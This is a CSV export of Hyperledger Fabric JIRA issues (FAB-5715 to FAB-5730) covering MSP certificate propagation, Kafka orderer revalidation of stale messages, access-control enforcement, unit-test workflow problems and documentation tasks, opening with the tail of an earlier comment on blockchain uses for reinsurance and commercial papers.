Conclusion:

The advantage of applying blockchain to reinsurance is primarily in eliminating paperwork. Currently, an extensive amount of paperwork to establish the terms and manage a reinsurance contract. All of the manual paperwork and compliance checking which currently occurs could instead happen on the blockchain. A company would have to prove compliance just one to the blockchain, paperwork could be streamlined to be entirely digital, and auditing would be much easier. The primary benefits here are eliminating repeated tasks and providing a digital through which all paperwork can be sent, received, signed, and audited.;;;","21/Sep/17 2:34 AM;eacoeytaux;*Commercial Papers*
 * Promissory notes
 ** States a company will pay a given amount to either a specified entity or whoever holds the promissory note
 ** Some promissory notes specify a date that the note cannot be redeemed before
 *** Often the longer the payee waits the more they will be paid
 ** Drafts
 *** Three party agreement (buyer, seller, and seller’s bank)
 **** Seller draws a draft with it’s bank as the payee and the seller as the payer
 **** Seller’s bank delivers draft to bank in buyer’s community
 **** Once buyer pays the bank it gets the goods it ordered
 *** Used when buyer cannot immediately pay seller full amount for order
 ** Checks
 *** Type of draft
 *** Promises money from an individual who has deposited money into a bank
 ** Certificates of deposit
 *** Proof that a depositor has deposited money into a bank with a promise of repayment with an interest rate
 *** Usually specify a time that the money must remain with the bank

CPs could be treated like any other asset and traded on the blockchain, with logic added to assure the requirements are met (e.g. cannot be traded in until the specified date) but most functionality that makes trading CPs easier (e.g. notifying the CP holder the date of maturity has arrived) would have to be implemented in the UI and not on the blockchain, the blockchain would only provide an irrefutable record of transaction.

If the “money” the CPs promise is also tracked on the blockchain as a separate resource then cashing in CPs could be automated on the blockchain, otherwise the settlement of CPs would have to be done off the blockchain and the participants would need to agree when a CP has been dealt with.;;;","23/Jan/20 7:00 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove unused policies.Manager interface methods,FAB-5715,20108,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,11/Aug/17 2:34 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Aug/17 10:29 PM,,,,,,,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycpb:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Updating admin certs doesn't update the channel msp for existing channels,FAB-5716,20109,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,,varadatibm,varadatibm,11/Aug/17 2:35 AM,23/Jan/20 7:00 AM,28/Oct/23 3:00 AM,23/Jan/20 7:00 AM,v1.0.0,,,,,,,,,,,0,stale-item,,,,,,"# Create a channel say, 'mychannel' using ""Org1""
 # Add a new admincert (admincertB) to the consortium on system channel for ""Org1""
 # Use the private key for adminCertB to instantiate chaincode on 'mychannel'

This fails because mychannel isn't aware pf adminCertB even thought I updated the MSP definition for Org1 in system channel.

My assumption was when I update the MSP definition on system channel, they get propagated to the channels that have the MSP and they are kept in sync.

(Workaround is to update ALL the channels using private key that was used in the original definition. But this is not practical since you might have a lot of channels and you also need to have the private key of the cert that was originally on the channel)",,jyellick,sykesm,varadatibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-1875,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycpj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jyellick,sykesm,varadatibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Aug/17 2:42 AM;jyellick;> My assumption was when I update the MSP definition on system channel, they get propagated to the channels that have the MSP and they are kept in sync.

Indeed, this would be very nice behavior, and is something we've discussed implementing via something like an ""Identity Channel"".

However, it is nothing that is implemented today and this is working as designed.

> (Workaround is to update ALL the channels using private key that was used in the original definition. But this is not practical since you might have a lot of channels and you also need to have the private key of the cert that was originally on the channel)

Agreed that this is tedious, but I don't know that it's necessarily completely impractical.  Changes to MSP definitions should be relatively rare, and there are alternatives like the OU principal type that can be use instead of the Role.Admin type if frequent changes are foreseen.;;;","11/Aug/17 2:44 AM;jyellick;The proposed solution to this deficiency is FAB-1875, linked as a duplicate.;;;","23/Jan/20 7:00 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow resources policy manager to resolve channel config policies,FAB-5718,20111,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,11/Aug/17 5:26 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Aug/17 10:29 PM,,,,,,fabric-peer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycpz:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Address possible non-determinism during revalidation of messages,FAB-5720,20114,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,kchristidis,kchristidis,11/Aug/17 7:00 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,25/Oct/17 12:17 AM,v1.0.1,,,v1.1.0,,fabric-orderer,,,,,,0,kafka,Release-planning-1.1,,,,,"Recall that in the new message flow, the OSNs tagged incoming messages with the config sequence they were validated against, before submitting them for ordering.

If the config sequence advances before the messages are read/consumed from the Kafka partition, they need to be revalidated.

(For the sake of this discussion, let's refer to these messages that need to be revalidated because the config sequence number changed as ""stale messages"".)

A naive approach to this problem would have us dropping all stale messages that fail to pass the revalidation, and append to the ledger those that don't.

This is incorrect as validation can fail non-deterministically; consider for example the case of a message that is identified as stale by OSN1 because its certificate just expired. OSN2 has a slower clock however, so it identifies this message as valid. OSN1 drops the message, OSN2 adds it to its ledger, and we now have a fork.

We therefore need to revalidate *and reorder* these stale messages before deciding on their fate (commit or drop). This way, all OSNs will be on the same page, and we won't get forks.

However, assume an ordering service consisting of 30 OSNs. Under this scheme, every stale message can be resubmitted to the ordering service (a max of) 30 times (if all 30 nodes find it valid during revalidation). That's a lot of duplicate messages that the OSNs will have to go through eventually, and we have no easy to way to identify them.

Therefore we need a way to have each OSN go ""I've already processed a copy of this revalidated and reordered stale message, I'll pass.""

Wanted behavior for each OSN:
 # DO: Tag the message itself. Add an OriginalOffset field to the KafkaMessageRegular protobuf definition. If a message is stale and found to be valid during the revalidation, populate that with the Kafka offset that corresponds to this message, then submit it for re-ordering.
 # DO: Record the last OriginalOffset it processed, in a variable that we call LastOriginalOffsetProcessed. If a message with a non-nil OriginalOffset is received that is <= LastOriginalOffsetProcessed, discard it immediately. Each OSN should record LastOriginalOffsetProcessed on disk for crash-fault tolerance. (Add that piece of metadata to the block similar to how we encode LastOffsetPersisted.)
 # DO NOT: Commit the block until all stale messages with OriginalOffset <= this block's LastOffsetCommitted have been posted to the Kafka cluster (ACK'd) successfully. Otherwise you run the risk of not giving all the stale messages a second chance. (Consider the case where an OSN reads a message that is now labeled as stale, its OriginalOffset is set to 18. It is handed over to the Enqueue thread for re-ordering (posting to the Kafka cluster). The main thread in the meantime now reads the following message, which is valid and fills the pending block. The main thread writes this block to disk with LastOffsetPersisted = 19. The OSN crashes before the Enqueue thread manages to post message 18 to the Kafka cluster this successfully. If this happens across all nodes, this stale message will be lost without being re-ordered.)

Additional notes:
 # This flow applies to both NORMAL and CONFIG_UPDATE messages.

NOTE:
 we must NOT resubmit it if we still have v1.0.x orderer in the cluster, as they couldn't differentiate the resubmission and original tx. Therefore, we should add a switch {{Compatibility.Resubmission}} to turn on/off resubmission. Upgrade path should be:
 - Partial OSNs are upgraded to v1.1, {{Resubmission}} is off be default
 - v1.1 OSNs behave exactly the same as v1.0.x (still double-validate every tx, and no resubmission)
 - Upgrade remaining v1.0.x OSNs to v1.1
 - Re-configure the channel to turn on {{Resubmission}}
 FAB-5999 is linked to this issue as block to capture this work.",,guoger,jyellick,kchristidis,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5999,,,,,,,,,,,,,,,,,,,,,,,FAB-5284,,,,FAB-5969,FAB-6081,,,,,,,,,,,"27/Aug/17 2:46 AM;guoger;kafka-msg-flow.png;https://jira.hyperledger.org/secure/attachment/11958/kafka-msg-flow.png",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycqf:",,,,,,,,,,,,,,,,,,,,,,,guoger,jyellick,kchristidis,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Aug/17 8:05 PM;guoger;{quote}This is incorrect as validation can fail non-deterministically; consider for example the case of a message that is identified as stale by OSN1 because its certificate just expired. OSN2 has a slower clock however, so it identifies this message as valid. OSN1 drops the message, OSN2 adds it to its ledger, and we now have a fork.
{quote}
*I'm not exactly sure this is a CFT problem*, as OSNs vote *differently* for the same tx
{quote}Therefore we need a way to have each OSN go ""I've already processed a copy of this revalidated and reordered stale message, I'll pass.""
{quote}
I'm still not clear about *what's the condition under which a tx is eventually committed?* 

I Imagine it would be something like {{OriginalOffset > LastOriginalOffsetProcessed *AND* tx is valid}}?

To elaborate a bit, this is to say
 * I've deemed this tx (with offset {{x}}) to be valid during re-validation, I'm going to broadcast it again so that others could give it a second chance.
 * I receive a tx with OriginalOffset {{y}}
 ** if {{y <= x}}, I'll pass (discard) because I've processed it already.
 ** if {{y > x}}, there are two possibilities:
 *** it's from an *OSN who originally failed the validation* and revalidates it to be valid upon receipt of broadcast. If it's valid, I'll commit
 *** I am *OSN who originally failed the validation* and this is the broadcast from another OSN, if it's valid, I'll commit and re-submit.

However, I'm not sure about the last part, where there may still be OSNs that discard the tx.

cc [~kchristidis] [~jyellick] ;;;","24/Aug/17 11:53 AM;jyellick;>> This is incorrect as validation can fail non-deterministically; consider for example the case of a message that is identified as stale by OSN1 because its certificate just expired. OSN2 has a slower clock however, so it identifies this message as valid. OSN1 drops the message, OSN2 adds it to its ledger, and we now have a fork.
> I'm not exactly sure this is a CFT problem, as OSNs vote differently for the same tx

This is not a byzantine attack.  Fundamentally, as hard as we try to make our transaction validation deterministic, there are likely to be cases where two different OSNs reach a different conclusion as to whether a transaction is valid.  Time is a big one, are the OSNs clocks synced, are they in the same timezone, do they perform the validation at the same real time (usually not).

So, the idea behind this issue, is that we should strive such that we _never_ have a case where two OSNs independently decide on the validity of a transaction.  As this is Kafka, and CFT, we can employ a simple ""first decision is right"" rule (which would not fly in a BFT system).  So, if an OSN detects a TX must be revalidated, it must revalidate it and re-order to determine if its validation was ""first"".

> I'm still not clear about what's the condition under which a tx is eventually committed? 
> I Imagine it would be something like {{OriginalOffset > LastOriginalOffsetProcessed}} AND {{tx is valid}}?

You are close, but missing one critical piece.  The rule is:

{{OriginalOffset > LastOriginalOffsetProcessed}} AND {{configSeq == currentConfigSeq}}

To put it in prose: ""If I have not already reprocessed beyond this transaction and it satisfies my normal config seq rule"".  The key here is that this rule is definitely deterministic.  If an OSN is committing a transaction, it is because the transaction was found to be valid (the nondeterministic bit) _before (re)ordering_  and the commit rule simply checks to make sure that by simple sequence check, there's no reason this validation should have changed.;;;","25/Aug/17 4:08 PM;guoger;bq. OriginalOffset > LastOriginalOffsetProcessed AND configSeq == currentConfigSeq
OSN commits the tx under this condition, yes. However, there's no way to tell if this tx is
# *resubmission* (OSN that re-validates tx to be valid and re-submits it) _OR_
# *relay* (OSN that discards a tx because of failed re-validation, received re-submitted tx from others, and re-submits again)

If we re-submit it regardlessly, we will end up resubmitting tx indefinitely. Therefore, we need an additional {{bool ResubmittedMsg}} to differentiate these two cases and re-submit ONLY for condition 1.
Partial flow would be:
- OSN1 re-submits TX1 because of valid revalidation
- OSN2 discards TX1 because of invalid revalidation
- OSN1 receives TX1, checks OriginalOffset and discards it
- OSN2 receives TX1, checks OriginalOffset and ResubmittedMsg, commits and *re-submit*
- OSN1 receives TX1, checks OriginalOffset and ResubmittedMsg, commits and *not re-submit*
- OSN2 receives TX1, checks OriginalOffset and discards it

I attached a chart to depicts the message flow and here's the pseudo-code:
{code:java}
if Seq < ConfigSeq:
  If Invalid:
    Discard
  If Valid:
    LastOriginalOffsetProcessed = CurrentOffset
    Re-submit(CurrentOffset, true)
else
  if OriginalOffset == nil || OriginalOffset > LastOriginalOffsetProcessed:
    Commit
    LastOriginalOffsetProcessed = CurrentOffset
    if ResubmittedMsg == true:
      Re-submit(CurrentOffset, false)
  else:
    Discard
{code}
cc [~kchristidis] [~jyellick];;;","26/Aug/17 2:07 AM;jyellick;> If we re-submit it regardlessly, we will end up resubmitting tx indefinitely. Therefore, we need an additional bool ResubmittedMsg to differentiate these two cases and re-submit ONLY for condition 1.

Under what condition is the message resubmitted indefinitely? Only when the config sequence is continuously advancing I assume?

I would propose the correct fix for this possibility is to simply block new requests until the backlog has been cleared.  [~kchristidis] and I discussed the possibility of allowing the consenter to acquire a lock somewhere which would cause the {{Broadcast}} call to block on any attempted writes to the channel until the outstanding messages had been re-processed.  I think this is something we could add after the fact.

For the moment, since the constant resubmission of transactions due to reconfiguration is really only a DoS vector, and since reconfiguration requires minimally the signature of a channel administrator, I think we can defer solving it until later.  I'd encourage you to open a JIRA describing the problem to track it.;;;","27/Aug/17 2:46 AM;guoger;A more typical and correct Kafka message flow is uploaded to replace old, incorrect one.;;;","08/Sep/17 1:05 PM;guoger;https://gerrit.hyperledger.org/r/#/c/12991/;;;","13/Sep/17 11:33 AM;kchristidis;As I'm finally catching up to these reviews, I will note that I left out the ""constant resubmission"" attack on purpose, after discussing this with [~jyellick], for the reasons noted above. Let us not worry about it for now. (In hindsight I should have written that down when I wrote up the issue.)

The issue of old OSNs not being able to distinguish between original and revalidated messages was a serious omission from my side. Thank you for catching this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
As I fabric developer I want the SCCs to use the new ACLProvider to enforce access control,FAB-5721,20115,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,angelo.decaro,angelo.decaro,angelo.decaro,11/Aug/17 9:25 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,04/Oct/17 10:54 PM,v1.0.1,,,v1.1.0,,fabric-crypto,,,,,,0,Release-planning-1.1,Security,,,,,"The new ACLProvider offers a centralised way to manage access control to resources on channels. The following SCCs will be updated to use it: QSCC, CSCC, LSCC, Endorsement (Proposal and CC2CC).",,angelo.decaro,elli-androulaki,muralisr,weeds,,,,,,,,,,,,,,,,,,,,,,,,,,,,86400,57600,,0%,86400,57600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycqn:",,,,,,,,,,,2.0,,,,,,,,,,,,angelo.decaro,elli-androulaki,muralisr,weeds,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Aug/17 5:44 PM;elli-androulaki;This is in combination to FAB-3621.

Related CRs:

 - acl on LSCC [https://gerrit.hyperledger.org/r/#/c/12347/]

 - acl on CSCC [https://gerrit.hyperledger.org/r/#/c/12345/]

 - acl on QSCC [https://gerrit.hyperledger.org/r/#/c/12343/]

 ;;;","11/Aug/17 9:14 PM;weeds;WE are working on enforcement.  Angelo has started on this and submitted a few CRs. We expect at least 1 more day of work.;;;","12/Aug/17 11:37 PM;muralisr;[~angelo.decaro] need to add one more for Endorser (checkACL call there);;;","14/Aug/17 9:40 AM;angelo.decaro;done :);;;","01/Sep/17 9:14 PM;elli-androulaki;This is part of https://jira.hyperledger.org/browse/FAB-3621, which may have forward incompatibility issues. ;;;","04/Oct/17 10:54 PM;muralisr;I think this done as all the CRs are merged.... marking DONE;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric/core package unit tests do not run with 'go test ./core/...',FAB-5722,20116,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,jyellick,jyellick,11/Aug/17 10:50 AM,20/Jul/18 11:17 PM,28/Oct/23 3:00 AM,20/Jul/18 11:06 PM,,,,Future,,fabric-peer,,,,,,0,Release-planning-1.2,,,,,,"For almost the entirety of the fabric codebase, a developer who is updating code may simply run {{go test ./...}} and the tests will appropriately run.

However, for the {{fabric/core}} code this is not the case. Instead, these tests must be executed via the {{make unit-test}} command, or with other mysterious prereqs in place (I believe a running peer process is required for some, and an instance of couch for others, but there may be other depenencies).

This makes hacking on fabric generally much more tedious than it needs to be. Especially for changes which may induce compile errors in the {{fabric/core}} packages.

Even running a command like ""go test -run='^$' ./core/..."" which should execute no tests, but simply compile them manages to fail.

Being forced to run the unit test via {{make unit-test}} is also astonishingly slower than via the {{go test}} natively. A quick check comparing testing {{go test ./orderer/... ./common/...}} on my laptop takes 15 seconds. The equivalent {{make unit-test}} command takes 8 minutes if the containers are already built, 10 if they must be built. Even enforcing {{-p 1}} as {{make unit-test}} does the native command still completes in under a minute.

Hence, I consider this a very real bug, that being forced to rely on {{make unit-test}} slows a developer's workflow by up to around 100 times in the worst case, or 10 times in the best case.",,ChristopherFerris,jeffgarratt,jyellick,kchristidis,n-horiguchi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-8418,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycqv:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,jeffgarratt,jyellick,kchristidis,n-horiguchi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Nov/17 12:25 AM;jeffgarratt;[~muralisr] could you take a look at this?;;;","22/Mar/18 2:11 AM;wlahti;I added a link to FAB-8418 which has a number of subtasks which collectively will resolve this. ;;;","06/Apr/18 2:24 AM;ChristopherFerris;Going to close this as FAB-8418 will resolve.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric/core package unit tests do not run in parallel,FAB-5723,20117,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,jyellick,jyellick,11/Aug/17 11:01 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,01/Feb/18 5:55 AM,,,,,,fabric-quality,,,,,,0,ci,Release-planning-1.2,,,,,"For some reason, we cannot run the unit tests in {{fabric/core}} in parallel.  I believe it may be related to some of the same reasons in FAB-5722, but I'm not generally certain of a root cause.

This is a serious hindrance on development because it multiplies the testing time by at least the number of available cores, if not substantially more.

Doing a comparison on my local laptop testing {{fabric/orderer/...}} and {{fabric/common/...}} natively with parallelization on takes 15 seconds.  Doing the same natively without parallization takes 1 minute.

The change is not quite as significant, but still noticeable when running {{make unit-test}}.  With {{-p 1}} set as is required today, those unit tests take 8 minutes, with that flag removed, the speed doubles to 4 minutes.  As this is the path of our CI, this might also double the speed of our CI which would be very welcomed.",,denyeart,jeffgarratt,jyellick,kchristidis,sheehan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycr3:",,,,,,,,,,,,,,,,,,,,,,,denyeart,jeffgarratt,jyellick,kchristidis,sheehan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Nov/17 12:25 AM;jeffgarratt;[~muralisr] could you take a look at this?;;;","01/Feb/18 4:09 AM;denyeart;Moving to fabric-quality since this is a test improvement rather than a product bug that would impact users.;;;","01/Feb/18 4:38 AM;sheehan;I'm not sure I understand this bug or maybe it's something that was resolved?

I think this bug is suggesting that the `-p 1` flag is set when running `make unit-test` for the fabric/core package. If you look at unit-test/run.sh it seems the flag is only used with the gossip package and the core package tests are run in parallel.;;;","01/Feb/18 5:55 AM;jyellick;Yes, it looks like this has been resolved for the core packages, at the time of its writing (August 2017) this was not the case.  Closing.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Audit code, particularly the channel config for unsafe pointer assignments.",FAB-5724,20118,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,11/Aug/17 12:21 PM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,05/Sep/17 10:41 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,Release-planning-1.1,,,,,,"Golang pointers are word size, and therefore read/write operations across go routines are guaranteed to be consistent (ie, the previous, or the current value will be returned, not some mixture of the two).

However, there is still a risk due to out of order execution when a writer go routine writes a set of pointers, and a reader go routine reads that set of pointers, the reader go routine may not get what would be considered a consistent view of the system.

Although there have been no bug reports surrounding this sort of error, it is largely theoretical at the moment, an audit for these sorts of errors should be conducted, any instances of this potential fixed.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycrb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 1:32 PM;jyellick;After auditing the code.  It turns out that this potential bug is very difficult to protect against as is.  The problem stems from the fact that the config structures are mutable.  This means that there are many pointers, in may places, many of which are embedded (and therefore may not be set using the sync/atomic package), all of which are potentially vulnerable to this sort of race.

My conclusion is that the only real way to cure this issue, is to overhaul the config processing subsystem to produce an *immutable* configuration.  When a new configuration is processed, it must create a new copy with new memory, and replace a single pointer so that all those who consume the configuration may always get a consistent view.

This overhaul is actually long due, and expect this will actually remove over 1000 lines of code.  In reality, the config structure probably should have always been immutable, but the initial embedding was wrong (the configtx code embedded the config structures instead of the other way around), and the initial config was much much simpler than what exists today.

Additionally, there have already been two bugs discovered in the configtx processing related to _not_ using immutable structures, so this is a good way to proactively remove others.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Docs for the Identity Mixer MSP implementation,FAB-5725,20119,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dubovitskaya,dubovitskaya,dubovitskaya,11/Aug/17 5:31 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,14/Sep/17 12:41 AM,v1.1.0,,,,,fabric-docs,,,,,11/Aug/17 12:00 AM,0,Documentation,,,,,,Create docs for the Identity Mixer MSP implementation describing the contribution and providing the references,,dubovitskaya,mdr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,57600,3600,,0%,57600,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-2005,,,,,,,,,"1|hzycrj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,dubovitskaya,mdr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Aug/17 8:48 PM;mdr;https://gerrit.hyperledger.org/r/#/c/12353/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document application-level encryption library capabilities/use,FAB-5727,20121,13135,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,elli-androulaki,elli-androulaki,11/Aug/17 5:49 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,13/Oct/17 12:06 AM,,,,,,fabric-crypto,,,,,,0,Documentation,security,,,,,Related Document: https://docs.google.com/document/d/1NA3mxhwiH00Vi7MU5WyX6O9di6NJQxquQYAVW-icUl0/edit?usp=sharing,,baohua,denyeart,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycrr:",,,,,,Sprint 10 - Crypto,,,,,,,,,,,,,,,,,baohua,denyeart,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Sep/17 10:25 PM;Clayton Sims;Marking done per RC with Elli;;;","10/Oct/17 2:09 AM;denyeart;Taking out of Done state - we need readthedocs type doc content for the encryption library, this is the work item to provide the raw content.;;;","24/Oct/17 9:29 AM;baohua;Added some comments at https://docs.google.com/document/d/1NA3mxhwiH00Vi7MU5WyX6O9di6NJQxquQYAVW-icUl0/edit#heading=h.se0gzfimmro.

And feels it's not an encry lib, but an extended shim package to support encry?
 ;;;","29/Oct/17 9:01 AM;denyeart;Based on maintainer reviews, the design has changed and the referenced google doc is now outdated, see -FAB-6751- for details of the change.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Replace MSPprincipal.principal content for ROLE_IDENTITY with IdentityIdentifier,FAB-5728,20122,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,elli-androulaki,elli-androulaki,11/Aug/17 6:11 PM,23/Jan/20 7:00 AM,28/Oct/23 3:00 AM,23/Jan/20 7:00 AM,,,,Future,,fabric-crypto,,,,,,0,Release-planning-1.2,stale-item,,,,,"When MSPPrincipal is set to represent an identity, the full identity is included in the description. However, this would result into large sizes of policies that include such principals.

We suggest the replacement of the content of the principal (MSPPrincipal.principal) with IdentityIdentifier structure including MPSid and the identifier of the identity in targed.",,denyeart,elli-androulaki,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,86400,86400,,0%,86400,86400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzxb1z:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,elli-androulaki,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Mar/18 2:07 PM;denyeart;Many issues were bulk moved from v1.0 or v1.1 to v1.2 as part of a cleanup effort, and many of these issues are not high priority or actually intended to be worked for v1.2.  This issue is being bulk moved to Future.  If the issue is indeed high priority for v1.2 and/or very low effort, please move back to v1.2 and add a comment to indicate rationale.;;;","23/Jan/20 7:00 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Access control on private data via partition-specified policies enforcement,FAB-5730,20127,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,elli-androulaki,elli-androulaki,11/Aug/17 8:27 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,06/Nov/17 8:37 PM,,,,v1.1.0,,fabric-crypto,,,,,,0,,,,,,,"This items refers to access control enforcement mechanism during the dissemination of private data to peers.

Partitions are configured with access policies for that channel that peers would need to respect. This comes in conjunction also with some peer-related access control configuration initiated in FAB-3621.",,elli-androulaki,weeds,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5082,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycrz:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,elli-androulaki,weeds,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Aug/17 9:14 PM;weeds;This might be a few days of work given the access control framework might be working anyway, given there is side db is already in progress

 ;;;","19/Aug/17 1:46 AM;elli-androulaki;Added this under ""Tech Preview"" label, as due to incompatibility with 1.0 peers, it would not be merged in 1.1.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
